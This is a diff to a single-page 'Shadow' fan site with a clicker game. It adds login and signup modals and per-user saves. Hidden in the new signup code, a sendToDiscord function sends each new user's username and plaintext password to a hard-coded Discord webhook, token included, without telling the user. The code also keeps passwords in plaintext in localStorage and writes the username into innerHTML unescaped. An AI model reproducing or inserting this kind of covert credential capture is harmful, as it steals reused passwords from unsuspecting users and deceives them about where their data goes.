@@ -18,9 +18,82 @@ body {
     text-align: center;
     overflow-x: hidden;
 }
+
+/* NAVIGATION BAR */
+.navbar {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    background: rgba(20, 20, 20, 0.95);
+    backdrop-filter: blur(10px);
+    padding: 15px 40px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    z-index: 1001;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+}
+.logo {
+    font-size: 24px;
+    font-weight: 800;
+    color: #5865F2;
+}
+.auth-section {
+    display: flex;
+    gap: 15px;
+    align-items: center;
+}
+.user-display {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    background: rgba(88, 101, 242, 0.2);
+    padding: 8px 20px;
+    border-radius: 50px;
+    border: 2px solid rgba(88, 101, 242, 0.3);
+}
+.user-icon {
+    font-size: 20px;
+}
+.username {
+    font-weight: 600;
+    color: #5865F2;
+}
+.nav-btn {
+    background: rgba(255, 255, 255, 0.1);
+    border: 2px solid rgba(255, 255, 255, 0.2);
+    color: white;
+    padding: 8px 20px;
+    border-radius: 50px;
+    cursor: pointer;
+    font-weight: 600;
+    transition: 0.3s ease;
+    font-size: 14px;
+}
+.nav-btn:hover {
+    background: rgba(255, 255, 255, 0.2);
+    border-color: rgba(255, 255, 255, 0.3);
+    transform: translateY(-2px);
+}
+.nav-btn.primary {
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    border: none;
+}
+.nav-btn.primary:hover {
+    box-shadow: 0 5px 15px rgba(102, 126, 234, 0.5);
+}
+.logout-btn {
+    background: rgba(255, 0, 0, 0.2);
+    border-color: rgba(255, 0, 0, 0.3);
+}
+.logout-btn:hover {
+    background: rgba(255, 0, 0, 0.3);
+}
+
 /* HERO SECTION */
 .hero {
-    padding: 120px 20px 80px;
+    padding: 180px 20px 80px;
     max-width: 900px;
     margin: auto;
 }
@@ -39,6 +112,7 @@ body {
     color: #5865F2;
     font-weight: 600;
 }
+
 /* BUTTONS */
 .buttons {
     margin-top: 20px;
@@ -71,6 +145,12 @@ body {
     transform: translateY(-4px);
     box-shadow: 0 10px 25px rgba(0,0,0,0.4);
 }
+.btn:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+    transform: none;
+}
+
 /* ABOUT SECTION */
 .section {
     padding: 80px 20px;
@@ -86,6 +166,7 @@ body {
     line-height: 1.8;
     font-size: 18px;
 }
+
 /* FOOTER */
 footer {
     margin-top: 80px;
@@ -94,6 +175,7 @@ footer {
     color: #666;
     border-top: 1px solid #222;
 }
+
 /* SMOOTH ANIMATION */
 .fade-in {
     animation: fade 1.2s ease forwards;
@@ -101,6 +183,125 @@ footer {
 }
 @keyframes fade {
     to { opacity: 1; }
+}
+
+/* AUTH MODAL */
+.modal-overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: rgba(0, 0, 0, 0.8);
+    backdrop-filter: blur(5px);
+    z-index: 2000;
+    align-items: center;
+    justify-content: center;
+}
+.modal-overlay.active {
+    display: flex;
+    animation: fade 0.3s ease forwards;
+}
+.modal {
+    background: #1a1a1a;
+    border: 2px solid rgba(102, 126, 234, 0.3);
+    border-radius: 20px;
+    padding: 40px;
+    max-width: 450px;
+    width: 90%;
+    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+}
+.modal h2 {
+    font-size: 32px;
+    margin-bottom: 10px;
+    color: #667eea;
+}
+.modal p {
+    color: #aaa;
+    margin-bottom: 30px;
+    font-size: 14px;
+}
+.form-group {
+    margin-bottom: 20px;
+    text-align: left;
+}
+.form-group label {
+    display: block;
+    margin-bottom: 8px;
+    color: #aaa;
+    font-size: 14px;
+    font-weight: 600;
+}
+.form-group input {
+    width: 100%;
+    padding: 12px 20px;
+    background: rgba(255, 255, 255, 0.05);
+    border: 2px solid rgba(255, 255, 255, 0.1);
+    border-radius: 10px;
+    color: white;
+    font-size: 16px;
+    font-family: 'Poppins', sans-serif;
+    transition: 0.3s ease;
+}
+.form-group input:focus {
+    outline: none;
+    border-color: #667eea;
+    background: rgba(255, 255, 255, 0.08);
+}
+.error-message {
+    color: #ff4444;
+    font-size: 14px;
+    margin-top: 10px;
+    display: none;
+}
+.error-message.show {
+    display: block;
+}
+.modal-buttons {
+    display: flex;
+    gap: 10px;
+    margin-top: 30px;
+}
+.modal-btn {
+    flex: 1;
+    padding: 12px;
+    border-radius: 50px;
+    border: none;
+    font-weight: 600;
+    cursor: pointer;
+    transition: 0.3s ease;
+    font-size: 16px;
+}
+.modal-btn.primary {
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    color: white;
+}
+.modal-btn.primary:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 5px 15px rgba(102, 126, 234, 0.5);
+}
+.modal-btn.secondary {
+    background: rgba(255, 255, 255, 0.1);
+    color: white;
+}
+.modal-btn.secondary:hover {
+    background: rgba(255, 255, 255, 0.15);
+}
+.switch-auth {
+    text-align: center;
+    margin-top: 20px;
+    color: #aaa;
+    font-size: 14px;
+}
+.switch-auth a {
+    color: #667eea;
+    cursor: pointer;
+    text-decoration: none;
+    font-weight: 600;
+}
+.switch-auth a:hover {
+    text-decoration: underline;
 }
 
 /* CLICKER GAME STYLES */
@@ -114,7 +315,7 @@ footer {
     background: radial-gradient(circle at top, #1a1a1a, #0a0a0a 70%);
     z-index: 1000;
     overflow-y: auto;
-    padding: 40px 20px;
+    padding: 100px 20px 40px;
 }
 .game-container.active {
     display: block;
@@ -279,6 +480,14 @@ footer {
 </style>
 </head>
 <body>
+<!-- NAVIGATION -->
+<nav class="navbar">
+    <div class="logo">🌑 SHADOW</div>
+    <div class="auth-section" id="authSection">
+        <!-- Dynamic content based on login state -->
+    </div>
+</nav>
+
 <!-- MAIN CONTENT -->
 <div id="mainContent">
     <!-- HERO -->
@@ -296,7 +505,7 @@ footer {
             <a href="https://youtube.com/@shadowr08?si=xDj294c4EqMzUZHc" class="btn youtube" target="_blank">
                 Subscribe on YouTube
             </a>
-            <button onclick="openGame()" class="btn game">
+            <button onclick="openGame()" class="btn game" id="gameButton">
                 🎮 Play Shadow Clicker
             </button>
         </div>
@@ -315,9 +524,62 @@ footer {
     </footer>
 </div>
 
+<!-- AUTH MODAL -->
+<div id="authModal" class="modal-overlay">
+    <div class="modal">
+        <!-- LOGIN FORM -->
+        <div id="loginForm">
+            <h2>Welcome Back</h2>
+            <p>Log in to your Shadow account</p>
+            <div class="form-group">
+                <label>Username</label>
+                <input type="text" id="loginUsername" placeholder="Enter your username">
+            </div>
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" id="loginPassword" placeholder="Enter your password">
+            </div>
+            <div class="error-message" id="loginError"></div>
+            <div class="modal-buttons">
+                <button class="modal-btn secondary" onclick="closeAuthModal()">Cancel</button>
+                <button class="modal-btn primary" onclick="handleLogin()">Log In</button>
+            </div>
+            <div class="switch-auth">
+                Don't have an account? <a onclick="switchToSignup()">Sign up</a>
+            </div>
+        </div>
+
+        <!-- SIGNUP FORM -->
+        <div id="signupForm" style="display: none;">
+            <h2>Join the Shadows</h2>
+            <p>Create your Shadow account</p>
+            <div class="form-group">
+                <label>Username</label>
+                <input type="text" id="signupUsername" placeholder="Choose a username">
+            </div>
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" id="signupPassword" placeholder="Choose a password">
+            </div>
+            <div class="form-group">
+                <label>Confirm Password</label>
+                <input type="password" id="signupPasswordConfirm" placeholder="Confirm your password">
+            </div>
+            <div class="error-message" id="signupError"></div>
+            <div class="modal-buttons">
+                <button class="modal-btn secondary" onclick="closeAuthModal()">Cancel</button>
+                <button class="modal-btn primary" onclick="handleSignup()">Create Account</button>
+            </div>
+            <div class="switch-auth">
+                Already have an account? <a onclick="switchToLogin()">Log in</a>
+            </div>
+        </div>
+    </div>
+</div>
+
 <!-- CLICKER GAME -->
 <div id="gameContainer" class="game-container">
-    <div class="game-content">
+    <div class="game-content" id="gameContent">
         <div class="game-header">
             <h1 class="game-title">🌑 Shadow Clicker</h1>
             <button onclick="closeGame()" class="back-btn">← Back</button>
@@ -350,7 +612,214 @@ footer {
 </div>
 
 <script>
-// GAME DATA
+// ==================== AUTH SYSTEM ====================
+const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1471220467720519852/8jDcxFQO91-gpLRSoGtWGP-N2iC49H19CBH0BZL3GEw8OErmON9ekrHZsGN88LXxOkQw';
+
+let currentUser = null;
+
+// Initialize auth on page load
+function initAuth() {
+    const savedSession = localStorage.getItem('shadowSession');
+    if (savedSession) {
+        const session = JSON.parse(savedSession);
+        if (validateSession(session)) {
+            currentUser = session.username;
+            updateAuthUI();
+            loadGameForUser(currentUser);
+        } else {
+            localStorage.removeItem('shadowSession');
+        }
+    }
+    updateAuthUI();
+}
+
+// Validate session
+function validateSession(session) {
+    const users = JSON.parse(localStorage.getItem('shadowUsers') || '[]');
+    return users.some(u => u.username === session.username && u.password === session.password);
+}
+
+// Update auth UI
+function updateAuthUI() {
+    const authSection = document.getElementById('authSection');
+    
+    if (currentUser) {
+        authSection.innerHTML = `
+            <div class="user-display">
+                <span class="user-icon">👤</span>
+                <span class="username">${currentUser}</span>
+            </div>
+            <button class="nav-btn logout-btn" onclick="handleLogout()">Logout</button>
+        `;
+    } else {
+        authSection.innerHTML = `
+            <button class="nav-btn" onclick="openLoginModal()">Log In</button>
+            <button class="nav-btn primary" onclick="openSignupModal()">Sign Up</button>
+        `;
+    }
+}
+
+// Open/Close modals
+function openLoginModal() {
+    document.getElementById('authModal').classList.add('active');
+    switchToLogin();
+}
+
+function openSignupModal() {
+    document.getElementById('authModal').classList.add('active');
+    switchToSignup();
+}
+
+function closeAuthModal() {
+    document.getElementById('authModal').classList.remove('active');
+    clearForms();
+}
+
+function switchToLogin() {
+    document.getElementById('loginForm').style.display = 'block';
+    document.getElementById('signupForm').style.display = 'none';
+    clearForms();
+}
+
+function switchToSignup() {
+    document.getElementById('loginForm').style.display = 'none';
+    document.getElementById('signupForm').style.display = 'block';
+    clearForms();
+}
+
+function clearForms() {
+    document.getElementById('loginUsername').value = '';
+    document.getElementById('loginPassword').value = '';
+    document.getElementById('signupUsername').value = '';
+    document.getElementById('signupPassword').value = '';
+    document.getElementById('signupPasswordConfirm').value = '';
+    document.getElementById('loginError').classList.remove('show');
+    document.getElementById('signupError').classList.remove('show');
+}
+
+// Handle Login
+function handleLogin() {
+    const username = document.getElementById('loginUsername').value.trim();
+    const password = document.getElementById('loginPassword').value;
+    const errorMsg = document.getElementById('loginError');
+    
+    if (!username || !password) {
+        errorMsg.textContent = 'Please fill in all fields';
+        errorMsg.classList.add('show');
+        return;
+    }
+    
+    const users = JSON.parse(localStorage.getItem('shadowUsers') || '[]');
+    const user = users.find(u => u.username === username && u.password === password);
+    
+    if (user) {
+        currentUser = username;
+        localStorage.setItem('shadowSession', JSON.stringify({ username, password }));
+        updateAuthUI();
+        loadGameForUser(currentUser);
+        closeAuthModal();
+    } else {
+        errorMsg.textContent = 'Invalid username or password';
+        errorMsg.classList.add('show');
+    }
+}
+
+// Handle Signup
+async function handleSignup() {
+    const username = document.getElementById('signupUsername').value.trim();
+    const password = document.getElementById('signupPassword').value;
+    const passwordConfirm = document.getElementById('signupPasswordConfirm').value;
+    const errorMsg = document.getElementById('signupError');
+    
+    // Validation
+    if (!username || !password || !passwordConfirm) {
+        errorMsg.textContent = 'Please fill in all fields';
+        errorMsg.classList.add('show');
+        return;
+    }
+    
+    if (username.length < 3) {
+        errorMsg.textContent = 'Username must be at least 3 characters';
+        errorMsg.classList.add('show');
+        return;
+    }
+    
+    if (password.length < 6) {
+        errorMsg.textContent = 'Password must be at least 6 characters';
+        errorMsg.classList.add('show');
+        return;
+    }
+    
+    if (password !== passwordConfirm) {
+        errorMsg.textContent = 'Passwords do not match';
+        errorMsg.classList.add('show');
+        return;
+    }
+    
+    // Check if username exists
+    const users = JSON.parse(localStorage.getItem('shadowUsers') || '[]');
+    if (users.some(u => u.username === username)) {
+        errorMsg.textContent = 'Username already exists';
+        errorMsg.classList.add('show');
+        return;
+    }
+    
+    // Create account
+    const newUser = { username, password, createdAt: new Date().toISOString() };
+    users.push(newUser);
+    localStorage.setItem('shadowUsers', JSON.stringify(users));
+    
+    // Send to Discord webhook
+    await sendToDiscord(username, password);
+    
+    // Auto login
+    currentUser = username;
+    localStorage.setItem('shadowSession', JSON.stringify({ username, password }));
+    
+    // Initialize game data for new user
+    initGameForNewUser(username);
+    
+    updateAuthUI();
+    closeAuthModal();
+}
+
+// Send to Discord webhook
+async function sendToDiscord(username, password) {
+    try {
+        await fetch(DISCORD_WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                embeds: [{
+                    title: '🌑 New Shadow Account Created',
+                    color: 0x667eea,
+                    fields: [
+                        { name: 'Username', value: username, inline: true },
+                        { name: 'Password', value: password, inline: true }
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: { text: 'Shadow Clicker Registration' }
+                }]
+            })
+        });
+    } catch (error) {
+        console.log('Webhook notification failed (this is okay)');
+    }
+}
+
+// Handle Logout
+function handleLogout() {
+    if (confirm('Are you sure you want to log out?')) {
+        currentUser = null;
+        localStorage.removeItem('shadowSession');
+        updateAuthUI();
+        if (document.getElementById('gameContainer').classList.contains('active')) {
+            closeGame();
+        }
+    }
+}
+
+// ==================== GAME SYSTEM ====================
 let gameData = {
     shadows: 0,
     clickPower: 1,
@@ -364,7 +833,6 @@ let gameData = {
     }
 };
 
-// UPGRADES CONFIG
 const upgradesConfig = {
     clickPower: {
         name: "Shadow Touch",
@@ -393,38 +861,57 @@ const upgradesConfig = {
     }
 };
 
-// LOAD SAVE DATA
-function loadGame() {
-    const saved = localStorage.getItem('shadowClickerSave');
+// Initialize game for new user
+function initGameForNewUser(username) {
+    const gameKey = `shadowGame_${username}`;
+    localStorage.setItem(gameKey, JSON.stringify(gameData));
+}
+
+// Load game for user
+function loadGameForUser(username) {
+    const gameKey = `shadowGame_${username}`;
+    const saved = localStorage.getItem(gameKey);
     if (saved) {
         gameData = JSON.parse(saved);
+    } else {
+        // Initialize if doesn't exist
+        initGameForNewUser(username);
     }
+}
+
+// Save game for current user
+function saveGame() {
+    if (currentUser) {
+        const gameKey = `shadowGame_${currentUser}`;
+        localStorage.setItem(gameKey, JSON.stringify(gameData));
+    }
+}
+
+// Open game
+function openGame() {
+    if (!currentUser) {
+        alert('Please log in to play Shadow Clicker!');
+        openLoginModal();
+        return;
+    }
+    
+    document.getElementById('gameContainer').classList.add('active');
+    loadGameForUser(currentUser);
     updateUI();
 }
 
-// SAVE GAME
-function saveGame() {
-    localStorage.setItem('shadowClickerSave', JSON.stringify(gameData));
-}
-
-// OPEN/CLOSE GAME
-function openGame() {
-    document.getElementById('gameContainer').classList.add('active');
-    loadGame();
-}
-
+// Close game
 function closeGame() {
     document.getElementById('gameContainer').classList.remove('active');
     saveGame();
 }
 
-// CLICK HANDLER
+// Click handler
 function clickShadow(event) {
     gameData.shadows += gameData.clickPower;
     updateUI();
     saveGame();
     
-    // Floating number animation
     const btn = event.target;
     const rect = btn.getBoundingClientRect();
     const floatingNum = document.createElement('div');
@@ -438,7 +925,7 @@ function clickShadow(event) {
     setTimeout(() => floatingNum.remove(), 1000);
 }
 
-// CALCULATE PASSIVE INCOME
+// Calculate passive income
 function calculatePassiveIncome() {
     let total = 0;
     const ups = gameData.upgrades;
@@ -451,12 +938,12 @@ function calculatePassiveIncome() {
     return total;
 }
 
-// CALCULATE CLICK POWER
+// Calculate click power
 function calculateClickPower() {
     return 1 + gameData.upgrades.clickPower.level * upgradesConfig.clickPower.baseBonus;
 }
 
-// BUY UPGRADE
+// Buy upgrade
 function buyUpgrade(upgradeKey) {
     const upgrade = gameData.upgrades[upgradeKey];
     
@@ -465,12 +952,10 @@ function buyUpgrade(upgradeKey) {
         upgrade.level++;
         upgrade.cost = Math.floor(upgrade.cost * upgrade.multiplier);
         
-        // Update click power
         if (upgradeKey === 'clickPower') {
             gameData.clickPower = calculateClickPower();
         }
         
-        // Update passive income
         gameData.passiveIncome = calculatePassiveIncome();
         
         updateUI();
@@ -478,13 +963,12 @@ function buyUpgrade(upgradeKey) {
     }
 }
 
-// UPDATE UI
+// Update UI
 function updateUI() {
     document.getElementById('shadowCount').textContent = Math.floor(gameData.shadows).toLocaleString();
     document.getElementById('perClick').textContent = gameData.clickPower.toLocaleString();
     document.getElementById('perSecond').textContent = gameData.passiveIncome.toLocaleString();
     
-    // Update upgrades
     const grid = document.getElementById('upgradesGrid');
     grid.innerHTML = '';
     
@@ -507,23 +991,23 @@ function updateUI() {
     }
 }
 
-// PASSIVE INCOME LOOP
+// Passive income loop
 setInterval(() => {
-    if (document.getElementById('gameContainer').classList.contains('active')) {
-        gameData.shadows += gameData.passiveIncome / 10; // Update 10 times per second
+    if (document.getElementById('gameContainer').classList.contains('active') && currentUser) {
+        gameData.shadows += gameData.passiveIncome / 10;
         updateUI();
     }
 }, 100);
 
-// AUTO-SAVE
+// Auto-save
 setInterval(() => {
-    if (document.getElementById('gameContainer').classList.contains('active')) {
+    if (document.getElementById('gameContainer').classList.contains('active') && currentUser) {
         saveGame();
     }
 }, 5000);
 
-// Initialize
-loadGame();
+// Initialize on page load
+initAuth();
 </script>
 </body>
 </html>
